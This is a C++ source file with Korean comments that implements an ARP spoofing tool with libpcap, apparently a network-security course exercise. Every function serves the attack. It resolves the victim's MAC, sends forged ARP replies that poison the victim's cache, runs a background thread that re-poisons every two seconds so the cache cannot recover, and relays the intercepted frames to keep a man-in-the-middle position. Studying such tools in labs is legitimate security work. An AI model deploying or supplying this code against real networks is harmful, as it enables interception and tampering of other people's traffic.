#include "arp_spoof.h"

// 공격자의 MAC 및 IP 주소 추출
bool get_Address(const char* interface, Mac *mac_out, Ip *ip_out) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;

    struct ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    std::strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        close(fd);
        return false;
    }
    *mac_out = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        close(fd);
        return false;
    }
    close(fd);

    struct sockaddr_in* sin = (struct sockaddr_in*)&ifr.ifr_addr;
    *ip_out = ntohl(sin->sin_addr.s_addr);

    return true;
}

// Sender의 실제 MAC 주소 동적 획득
Mac get_SenderMac(pcap_t* pcap, Mac attacker_mac, Ip attacker_ip, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(attacker_ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket failed, error=%s\n", pcap_geterr(pcap));
        return Mac::nullMac();
    }

    struct pcap_pkthdr* hdr;
    const u_char* reply_packet;

    while (true) {
        int cap_res = pcap_next_ex(pcap, &hdr, &reply_packet);
        if (cap_res == 0) continue;
        if (cap_res < 0) break;

        struct EthHdr* eth_hdr = (struct EthHdr*)reply_packet;
        if (ntohs(eth_hdr->type_) != EthHdr::Arp) continue;

        struct ArpHdr* arp_hdr = (struct ArpHdr*)(reply_packet + sizeof(struct EthHdr));
        if (arp_hdr->op() == ArpHdr::Reply) {
            if (arp_hdr->sip() == sender_ip) {
                return arp_hdr->smac();
            }
        }
    }
    return Mac::nullMac();
}

// 단일 ARP Infect 패킷 전송 함수
void send_arp_infect(pcap_t* pcap, Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket spoof_packet;

    spoof_packet.eth_.dmac_ = sender_mac;
    spoof_packet.eth_.smac_ = attacker_mac;
    spoof_packet.eth_.type_ = htons(EthHdr::Arp);

    spoof_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    spoof_packet.arp_.pro_ = htons(EthHdr::Ip4);
    spoof_packet.arp_.hln_ = Mac::Size;
    spoof_packet.arp_.pln_ = Ip::Size;
    spoof_packet.arp_.op_ = htons(ArpHdr::Reply);
    spoof_packet.arp_.smac_ = attacker_mac;
    spoof_packet.arp_.sip_ = htonl(target_ip);
    spoof_packet.arp_.tmac_ = sender_mac;
    spoof_packet.arp_.tip_ = htonl(sender_ip);

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&spoof_packet), sizeof(EthArpPacket));
}

// 백그라운드 스레드: 주기적으로 감염 유지 (Recover 방지)
void* infection_thread_func(void* arg) {
    ThreadArgs* args = (ThreadArgs*)arg;
    while (true) {
        for (const auto& session : args->sessions) {
            send_arp_infect(args->pcap, args->attacker_mac, session.sender_mac_, session.sender_ip_, session.target_ip_);
        }
        sleep(2);
    }
    return nullptr;
}

// 점보 프레임 고려한 패킷 릴레이 함수
void relay_packet(pcap_t* pcap, const u_char* packet, int length, const Session& session, Mac attacker_mac) {
    std::vector<u_char> relay_buf(packet, packet + length);
    struct EthHdr* eth_hdr = (struct EthHdr*)relay_buf.data();

    eth_hdr->smac_ = attacker_mac;
    eth_hdr->dmac_ = session.target_mac_;

    pcap_sendpacket(pcap, relay_buf.data(), length);
}